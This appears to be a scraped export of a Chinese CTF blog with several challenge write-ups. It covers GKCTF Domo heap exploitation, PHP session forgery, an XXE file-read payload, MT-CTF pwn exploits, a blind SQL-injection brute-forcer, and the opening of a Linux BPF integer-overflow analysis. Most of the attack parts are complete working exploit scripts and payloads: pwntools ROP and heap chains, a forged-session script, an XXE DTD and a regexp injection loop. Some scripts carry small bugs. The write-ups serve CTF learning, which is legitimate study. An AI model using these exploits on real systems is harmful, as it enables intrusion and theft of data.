malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf03a4+libc_baseprint(hex(one_gadget))create(0x10, b&#x27;&#x27;)  # 4delete(3)delete(4)create(0x10, b&#x27;&#x27;)  # 3show(3)print(r.recvuntil(b&#x27;\\n&#x27;))heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10a+0x10info(hex(heap_addr))delete(3)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))  # 0delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))  # 1delete(2)create(0xc0, b&#x27;&#x27;)  # 2delete(1)delete(2)_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]info(hex(_IO_2_1_stdin_))fake_chunk = _IO_2_1_stdin_+160-3create(0xc0, b&#x27;a&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 2create(0xa8, p64(0)*2+p64(one_gadget)*19)  # 1create(0x60, b&#x27;&#x27;)fake_vtable = heap_addr+0xf0payload = b&#x27;\\x00&#x27;*3 + p64(0)*2+p64(0x00000000ffffffff)+p64(0) * \\    2+p64(fake_vtable)+p64(0)*6create(0x63, payload)r.interactive()\n\n以上解法为nocbtm师傅的思路。下面为出题人的思路。\n其实出题人的思路在前半部分部分和上面是一样的，同样需要leak libc addr，leak heap addr，fastbin attack这三步攻击。\nenviron在libc中的environ里存放的是stack的地址。\n\n下面就是通过_IO_2_1_stdout_泄漏出environ当中的栈地址\n_IO_2_1_stdout_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]fake_chunk = _IO_2_1_stdout_ - 0x43create(0xc0, b&#x27;&#x27;) create(0x60, b&#x27;&#x27;)delete(3)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))payload = b&#x27;\\x00&#x27;*3+p64(0)*5+p64(libc_base+libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0xfbad1800)+p64(_IO_2_1_stdout_+131) * \\    3+p64(libc_base+libc.symbols[&#x27;environ&#x27;]) + \\    p64(libc_base+libc.symbols[&#x27;environ&#x27;]+8)create(0x60, b&#x27;&#x27;)create(0x63, payload)r.recvline()stack_addr = u64(r.recvuntil(b&#x27;1: Add a user&#x27;, drop=True))ret_addr = stack_addr-0xf0info(&#x27;stack_addr=&gt;&#x27;+hex(ret_addr))\n\n\n然后经过偏移计算获得main函数的返回地址。\n修改返回地址这里需要使用_IO_2_1_stdin_(不清楚的可以看看这篇文章echo back)来修改返回地址的内容\n_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]fake_chunk = _IO_2_1_stdin_-0x28create(0x60, b&#x27;&#x27;) delete(4)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk)) create(0x40, b&#x27;flag\\x00&#x27;)flag_addr = heap_addr+0x210create(0x60, b&#x27;&#x27;)edit(fake_chunk+0x8, p8(0x71))\n\n\n一样的操作，找到一个假的chunk然后修改_IO_buf_base和_IO_buf_end\npayload = p64(0)+p64(libc_base +                     libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(ret_addr-2)+p64(ret_addr+0x118)create(0x60, payload)  info(&#x27;fake_chunk=&gt;&#x27;+hex(fake_chunk))\n\n\n紧接着直接申请chunk过去然后修改掉上面两个指针的值，效果如上图。\n\n解释一下为什么要在_IO_buf_base处写上ret_addr-2   =&gt;   因为在最后输入的时候我们是在这个scanf当中输入的，所以我们需要预留两个位置输入b’5\\n’\norw最后因为题目在最后开启了沙盒所以我们只能用orw的方式来读flag。\npop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]write_addr = libc_base+libc.symbols[&#x27;write&#x27;]payload = b&#x27;5\\n&#x27;+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(72)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(flag_addr+8)+p64(pop_rdx)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + p64(flag_addr+8) + \\    p64(pop_rdx)+p64(0x100)+p64(write_addr)gdb.attach(r)r.recvuntil(b&#x27;&gt;&#x27;)r.sendline(payload)\n\n最后的栈内情况\n\n综上expfrom pwn import *r = process(&#x27;./domo&#x27;)# r = remote(&#x27;1.14.71.254&#x27;, 28041)elf = ELF(&#x27;./domo&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.sendline(content)def delete(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def show(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def edit(address, num):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;addr:&#x27;)    r.sendline(bytes(str(address), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;num:&#x27;)    r.sendline(num)create(0x40, b&#x27;&#x27;)  # 0create(0x68, b&#x27;&#x27;)  # 1create(0xf0, b&#x27;&#x27;)  # 2create(0x10, b&#x27;&#x27;)  # 3delete(2)create(0xf0, b&#x27;a&#x27;*7)  # 2show(2)print(r.recvuntil(b&#x27;\\n&#x27;))print(r.recvuntil(b&#x27;a\\n&#x27;))main_arena_88 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf02a4+libc_baseprint(hex(one_gadget))create(0x10, b&#x27;&#x27;)  # 4delete(3)delete(4)create(0x10, b&#x27;&#x27;)  # 3show(3)print(r.recvuntil(b&#x27;\\n&#x27;))heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10a+0x10info(hex(heap_addr))delete(3)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))  # 0delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))  # 1delete(2)_IO_2_1_stdout_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]fake_chunk = _IO_2_1_stdout_ - 0x43create(0xc0, b&#x27;&#x27;)  # 2create(0x60, b&#x27;&#x27;)  # 3delete(3)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 1payload = b&#x27;\\x00&#x27;*3+p64(0)*5+p64(libc_base+libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0xfbad1800)+p64(_IO_2_1_stdout_+131) * \\    3+p64(libc_base+libc.symbols[&#x27;environ&#x27;]) + \\    p64(libc_base+libc.symbols[&#x27;environ&#x27;]+8)create(0x60, b&#x27;&#x27;)  # 2create(0x63, payload)  # 3r.recvline()stack_addr = u64(r.recvuntil(b&#x27;1: Add a user&#x27;, drop=True))ret_addr = stack_addr-0xf0info(&#x27;ret_addr=&gt;&#x27;+hex(ret_addr))_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]fake_chunk = _IO_2_1_stdin_-0x28create(0x60, b&#x27;&#x27;)  # 4delete(4)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 1create(0x40, b&#x27;flag\\x00&#x27;)  # 2flag_addr = heap_addr+0x210create(0x60, b&#x27;&#x27;)  # 4edit(fake_chunk+0x8, p8(0x71))payload = p64(0)+p64(libc_base +                     libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(ret_addr-2)+p64(ret_addr+0x118)create(0x60, payload)  # 5info(&#x27;fake_chunk=&gt;&#x27;+hex(fake_chunk))pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]write_addr = libc_base+libc.symbols[&#x27;write&#x27;]payload = b&#x27;5\\n&#x27;+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(72)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(flag_addr+8)+p64(pop_rdx)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + p64(flag_addr+8) + \\    p64(pop_rdx)+p64(0x100)+p64(write_addr)r.recvuntil(b&#x27;&gt;&#x27;)r.sendline(payload)r.interactive()\n\n参考https://blog.play2win.top/2020/05/27/GKCTF%202020%20Domo%E5%88%86%E6%9E%90/#0x0-leak-libc-address%E5%92%8Cheap-address\n","categories":["比赛复现"],"tags":["_IO_FILE","fastbin attack","vtable","off by null"]},{"title":"HarekazeCTF2019_Easy_Notes","url":"/2021/11/02/HarekazeCTF2019-Easy-Notes/","content":"题目给了源码，emmm只不过感觉很多题都有github链接，但是题目并没说什么题目有源码，害我每次都在那儿像个啥子一样找半天。\n代码审计flag.php&lt;section&gt;  &lt;h2&gt;Get flag&lt;/h2&gt;  &lt;p&gt;    &lt;?php    if (is_admin()) &#123;      echo &quot;Congratulations! The flag is: &lt;code&gt;&quot; . getenv(&#x27;FLAG&#x27;) . &quot;&lt;/code&gt;&quot;;    &#125; else &#123;      echo &quot;You are not an admin :(&quot;;    &#125;    ?&gt;  &lt;/p&gt;&lt;/section&gt;lib.phpfunction is_admin() &#123;  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;    return false;  &#125;  return $_SESSION[&#x27;admin&#x27;] === true;&#125;\n\n需要session为admin===true\nlib.php里们没找到什么可以修改session文件的函数，但是在export.php里面存在操作文件的东西\n&lt;?phprequire_once(&#x27;init.php&#x27;);if (!is_logged_in()) &#123;  redirect(&#x27;/?page=home&#x27;);&#125;$notes = get_notes();if (!isset($_GET[&#x27;type&#x27;]) || empty($_GET[&#x27;type&#x27;])) &#123;  $type = &#x27;zip&#x27;;&#125; else &#123;  $type = $_GET[&#x27;type&#x27;];&#125;$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal$path = TEMP_DIR . &#x27;/&#x27; . $filename;if ($type === &#x27;tar&#x27;) &#123;  $archive = new PharData($path);  $archive-&gt;startBuffering();&#125; else &#123;  // use zip as default  $archive = new ZipArchive();  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);&#125;for ($index = 0; $index &lt; count($notes); $index++) &#123;  $note = $notes[$index];  $title = $note[&#x27;title&#x27;];  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);  $title = preg_replace(&#x27;#[/\\\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));&#125;if ($type === &#x27;tar&#x27;) &#123;  $archive-&gt;stopBuffering();&#125; else &#123;  $archive-&gt;close();&#125;header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . $filename . &#x27;&quot;;&#x27;);header(&#x27;Content-Length: &#x27; . filesize($path));header(&#x27;Content-Type: application/zip&#x27;);readfile($path);\n\n利用过程以sess_ 登录，那么在export的filename当中，get_user()就会返回sess再将type=.因为下面的字符串替换就会把后面’.’给弄没了。\n网上的exp:\nimport reimport requestsURL = &#x27;http://2c84bf34-ac3c-4a8e-8f77-7868da243209.node4.buuoj.cn:81/&#x27;while True:    # login as sess_    sess = requests.Session()    sess.post(URL + &#x27;login.php&#x27;, data=&#123;        &#x27;user&#x27;: &#x27;sess_&#x27;    &#125;)    # make a crafted note    sess.post(URL + &#x27;add.php&#x27;, data=&#123;        &#x27;title&#x27;: &#x27;|N;admin|b:1;&#x27;,        &#x27;body&#x27;: &#x27;hello&#x27;    &#125;)    # make a fake session    r = sess.get(URL + &#x27;export.php?type=.&#x27;).headers[&#x27;Content-Disposition&#x27;]    print(r)    sessid = re.findall(r&#x27;sess_([0-9a-z-]+)&#x27;, r)[0]    print(sessid)    # get the flag    r = requests.get(URL + &#x27;?page=flag&#x27;, cookies=&#123;        &#x27;PHPSESSID&#x27;: sessid    &#125;).content.decode(&#x27;utf-8&#x27;)    flag = re.findall(r&#x27;flag\\&#123;.+\\&#125;&#x27;, r)    if len(flag) &gt; 0:        print(flag[0])        break\n\n","categories":["web-buuctf"],"tags":["session伪造"]},{"title":"GoogleCTF2019_Quals_Bnv","url":"/2021/10/18/GoogleCTF2019-Quals-Bnv/","content":"拿到题目束手无策，扫描后无果直接看了wp，知道这是xxe\n\n江湖流传，有json的地方就有可能有xxe\n\n显示没有DTD，那就加一个\n\n没有声明这个element\n\n发现正常了,习惯性file协议看一下发现无果，看看可不可以引用内部文件\n\n\n不是标记语法，说被加载但是被断了，试试外部加载\n\n同样不行。但是根据这里会显示完整的实体名字，在加上上面已经加载了内容那就可以综合利用起来\n引用本地DTD文件\n这是ubuntu 系统自带的/usr/share/yelp/dtd/docbookx.dtd的部分内容，内部定义了一些实体，我们只需要覆盖之后就行了。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#x27;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;                    \t&lt;!-- 这里呢，就是通过file协议读取flag --&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        \t&lt;!-- 这里很好看出来，就是直接利用报错会显示完整的实体名字，把在上面读取的flag加载进去就行了 --&gt;        &amp;#x25;eval;        &amp;#x25;error;&#x27;&gt;%local_dtd;]&gt;\n\n引用文章https://www.freebuf.com/vuls/207639.html\n","categories":["web-buuctf"],"tags":["xxe"]},{"title":"MT-CTF2021复现","url":"/2021/12/14/MT-CTF/","content":"比赛当天给我哥过生日去了，没时间打比赛，下来复现比赛发现三道pwn题的难度都不是很难，除了最后一道，还没想到预期解，只能跟着wp做一遍非预期解\nbabyrop预备知识栈迁移\n流程分析程序的流程比较简单，首先存在一个字节的溢出，可以查看canary。然后让你比较password的地址，就可以进入漏洞函数。但是漏洞函数只存在八个字节的溢出\n利用分析因为我们只能溢出一个所以直接构造ROP是行不通的，所以考虑把ROP写到bss上面，直接放exp吧。\nexpfrom pwn import *elf = ELF(&#x27;./babyrop&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)r = process(&#x27;./babyrop&#x27;)context.log_level = &#x27;debug&#x27;# context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]pop_rdi_ret = 0x0000000000400913ret_addr = 0x0000000000400284puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]fake_stack = elf.bss()+0x320vuln_addr = 0x40072Cr.recvuntil(b&#x27;What your name? &#x27;)r.sendline(b&#x27;a&#x27;*(0x20-0x8+1))# gdb.attach(r)print(r.recvuntil(b&#x27;a&#x27;*(0x20-0x8+1)))# canary = (b&#x27;\\x00&#x27;+r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;))canary = u64(b&#x27;\\x00&#x27;+r.recv(7))print(hex(canary))# print(u64(r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)))r.recvuntil(b&#x27;Please input the passwd to unlock this challenge&#x27;)r.sendline(b&#x27;4196782&#x27;)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack)+p64(vuln_addr)r.recvuntil(b&#x27;OK!\\nNow, you can input your message&#x27;)r.sendline(payload)payload = p64(puts_got_addr)+p64(puts_plt_addr)+p64(vuln_addr) + \\    p64(canary)+p64(fake_stack-0x30)+p64(vuln_addr)r.send(payload)# gdb.attach(r)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack-0x20)+p64(pop_rdi_ret)r.send(payload)puts_addr = u64(p.recv(6).ljust(8, &#x27;\\x00&#x27;))libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]one_gadget = libc_base+0x4f3d5payload = b&#x27;a&#x27;*0x18+p64(canary)+p64(0)+p64(one_gadget)r.send(payload)r.interactive()\n\nbook_shop流程分析题目创建chunk的大小是固定的，并且libc的版本存在tcache，并且只有create存在写入内存的功能\n利用分析首先创建十一个大小为fastbin以内的chunk，释放7个chunk占满tcache，随后释放两个连续的chunk进入fastbin，然后触发malloc_consolidate使fastbin里的chunk合并进入unsortedbin，众所周知，unsortedbin只有一个chunk时，他的fd和bk都指向了main_arena，又因为存在UAF所以直接可以泄漏出libc的加载地址。然后再利用double free释放两个chunk进入fastbin，此时create七个chunk将tcache腾空，那么fastbin的chunk会进入tcache，接着利用double free修改tcache最后那个chunk的fd指针到__free_hook，因为tcache对于安全检测几乎没有就可以直接篡改掉__free_hook然后getshell。下面放出exp\nexpfrom pwn import *r = process(&#x27;./bookshop&#x27;)elf = ELF(&#x27;./bookshop&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r.recvuntil(b&#x27;The lucky number?\\n&#x27;)r.sendline(bytes(str(0x68), encoding=&#x27;utf8&#x27;))def create(content):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt; &#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Book do you want to read?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which Book do you want to take out from you bag?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))for i in range(11):    create(b&#x27;a&#x27;)for i in range(7):    delete(6-i)delete(7)delete(8)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;0&#x27;*0x400)show(7)r.recvuntil(b&#x27;Content: &#x27;)main_arena = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena))main_arena = main_arena-304print(hex(main_arena))# print(u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)))libc_base = main_arena-(next(libc.search(b&#x27;main_arena&#x27;))+0x3365f)print(hex(libc_base))delete(10)delete(8)delete(10)for i in range(7):    create(b&#x27;a&#x27;)free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]print(hex(free_hook))create(p64(free_hook-8))create(p64(0))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))delete(20)# gdb.attach(r)r.interactive()\n\nblind_box流程分析这道题目的libc版本依旧存在tcache，但是题目已经给了后门函数，非预期解就是在show函数的检测只检测了libc为0x7f的情况，但是libc存在0x7e所以直接可以泄漏出libc地址，非预期解很简单，但是预期解我下去再想想。\nexpfrom pwn import *from ctypes import cdllelf = ELF(&#x27;./Blindbox&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r = process(&#x27;./Blindbox&#x27;)context.log_level = &#x27;debug&#x27;r.recvuntil(b&#x27;Please tell me your name:&#x27;)r.sendline(b&#x27;196082&#x27;)r.recvuntil(b&#x27;The first lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The second lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The third lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))def create(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Give index for this Blindbox(1-3): &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def drop(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which index do you want to drop?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Blindbox do you want to open?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))for i in range(7):    create(1)    drop(1)create(1)create(2)drop(1)gdb.attach(r)show(1)r.recvuntil(b&#x27;Content of this Blindbox: &#x27;)main_arena = u64(r.recv(6).ljust(8, &#x27;\\x00&#x27;))-96libc_base = main_arena-next(libc.search(b&#x27;main_arena&#x27;))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]objdll = cdll.LoadLibrary(&#x27;./libc-2.31.so&#x27;)objdll.srand(0)for i in range(7):    r.recvuntil(b&quot;Round &quot;+bytes(str(i), encoding=&#x27;utf8&#x27;)+b&quot; Please guess&gt;&quot;)    res = system_addr ^ objdll.rand()    r.sendline(bytes(str(res), encoding=&#x27;utf8&#x27;))r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"NCTF2019_SQLi","url":"/2021/09/19/NCTF2019-SQLi/","content":"收集信息看了一下浏览器开发者工具没什么提示什么的\n\n那就直接上dirsearch\n\n看见robots.txt直接进，里面提示有hint.txt然后查看\n内容是\n$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#x27;|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,Then you will get the flag;\n\n这下就很明了了，他*的把贼多东西都禁用了。\n可以看到是php5.2.16。这下好办了。\n构造payload因为他已经给了我们sql语句了，那我们直接开始构造\nselect * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;闭合引号select * from users where username=&#x27;\\&#x27; and passwd=&#x27;%00&#x27;因为是php5.2.16的缘故可以用00截断，这样使引号闭合了，再就是用什么方式攻击呢？其实我也不知道，我看了一下wp知道了用regexp正则攻击\n\n所以就有了payload:\nselect * from users where username=&#x27;\\&#x27; and passwd=&#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;%00&#x27;\n\n不多废话了直接上exp了\nimport requestsimport urllibimport timeimport stringurl = &#x27;http://2beea7c9-88b6-4eaf-90af-be42303386ff.node4.buuoj.cn/index.php&#x27;payload = &#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;flag = &#x27;&#x27;string = string.ascii_lowercase+string.digits+&#x27;_&#x27;for j in range(50):    for i in string:        data = &#123;            &#x27;username&#x27;: &#x27;\\\\&#x27;,            &#x27;passwd&#x27;: payload.format(flag+i, urllib.parse.unquote(&#x27;%00&#x27;)) # 这里是防止%00被url编码了        &#125;        print(data[&#x27;passwd&#x27;])        time.sleep(0.1)        res = requests.post(url=url, data=data).text        # print(res)        if &#x27;welcome&#x27; in res:            flag += i            print(flag)            print(res)            break\n\n爆出密码不用admin帐户名直接登陆就可以拿到flag了。\n","categories":["web-buuctf"],"tags":["web","sql"]},{"title":"Linux kernel 4.20 BPF 整数溢出漏洞","url":"/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","content":"题目会放在:https://github.com/196082/196082\n漏洞分析kernel中的bpf模块主要用于用户态定义数据包过滤方法，如常见的抓包工具都基于此实现，并且用户态的Seccomp功能也与此功能相似。\n整数溢出该漏洞存在于BPF_MAP_CREATE功能中，并且可以看到处理的函数是map_create。\nSYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)&#123;  union bpf_attr attr = &#123;&#125;;  int err;  if (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))    return -EPERM;  err = bpf_check_uarg_tail_zero(uattr, sizeof(attr), size);  if (err)    return err;  size = min_t(u32, size, sizeof(attr));  /* copy attributes from user space, may be less than sizeof(bpf_attr) */  if (copy_from_user(&amp;attr, uattr, size) != 0)    return -EFAULT;  err = security_bpf(cmd, &amp;attr, size);  if (err &lt; 0)    return err;  switch (cmd) &#123;    case BPF_MAP_CREATE:      err = map_create(&amp;attr);      break;    case BPF_MAP_LOOKUP_ELEM:      err = map_lookup_elem(&amp;attr);      break;    case BPF_MAP_UPDATE_ELEM:      err = map_update_elem(&amp;attr);      break;      // ...  &#125;\n\n可以看到下面使用find_and_alloc_map函数创建一个map结构体，并为其分配编号，然后寻找出来生成的map。\nstatic int map_create(union bpf_attr *attr)&#123;  int numa_node = bpf_map_attr_numa_node(attr);  struct bpf_map *map;  int f_flags;  int err;  err = CHECK_ATTR(BPF_MAP_CREATE);  if (err)    return -EINVAL;  f_flags = bpf_get_file_flag(attr-&gt;map_flags);  if (f_flags &lt; 0)    return f_flags;  if (numa_node != NUMA_NO_NODE &amp;&amp;      ((unsigned int)numa_node &gt;= nr_node_ids ||       !node_online(numa_node)))    return -EINVAL;  /* find map type and init map: hashtable vs rbtree vs bloom vs ... */  map = find_and_alloc_map(attr);  if (IS_ERR(map))    return PTR_ERR(map);  err = bpf_obj_name_cpy(map-&gt;name, attr-&gt;map_name);  if (err)    goto free_map_nouncharge;  atomic_set(&amp;map-&gt;refcnt, 1);  atomic_set(&amp;map-&gt;usercnt, 1);  if (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;    struct btf *btf;    if (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;      err = -EINVAL;      goto free_map_nouncharge;    &#125;    btf = btf_get_by_fd(attr-&gt;btf_fd);    if (IS_ERR(btf)) &#123;      err = PTR_ERR(btf);      goto free_map_nouncharge;    &#125;    err = map_check_btf(map, btf, attr-&gt;btf_key_type_id,                        attr-&gt;btf_value_type_id);    if (err) &#123;      btf_put(btf);      goto free_map_nouncharge;    &#125;    map-&gt;btf = btf;    map-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;    map-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;  &#125;  err = security_bpf_map_alloc(map);  if (err)    goto free_map_nouncharge;  err = bpf_map_init_memlock(map);  if (err)    goto free_map_sec;  err = bpf_map_alloc_id(map);  if (err)    goto free_map;  err = bpf_map_new_fd(map, f_flags);  if (err &lt; 0) &#123;    /* failed to allocate fd.\t\t * bpf_map_put() is needed because the above\t\t * bpf_map_alloc_id() has published the map\t\t * to the userspace and the userspace may\t\t * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.\t\t */    bpf_map_put(map);    return err;  &#125;  return err;  free_map:  bpf_map_release_memlock(map);  free_map_sec:  security_bpf_map_free(map);  free_map_nouncharge:  btf_put(map-&gt;btf);  map-&gt;ops-&gt;map_free(map);  return err;&#125;\n\n下面分析find_and_alloc_map函数，那么首先还是先看一下传参结构体的定义：\nunion bpf_attr &#123;\tstruct &#123; /* anonymous struct used by BPF_MAP_CREATE command */\t\t__u32\tmap_type;\t/* one of enum bpf_map_type */\t\t__u32\tkey_size;\t/* size of key in bytes */\t\t__u32\tvalue_size;\t/* size of value in bytes */\t\t__u32\tmax_entries;\t/* max number of entries in a map */\t\t__u32\tmap_flags;\t/* BPF_MAP_CREATE related\t\t\t\t\t * flags defined above.\t\t\t\t\t */\t\t__u32\tinner_map_fd;\t/* fd pointing to the inner map */\t\t__u32\tnuma_node;\t/* numa node (effective only if\t\t\t\t\t * BPF_F_NUMA_NODE is 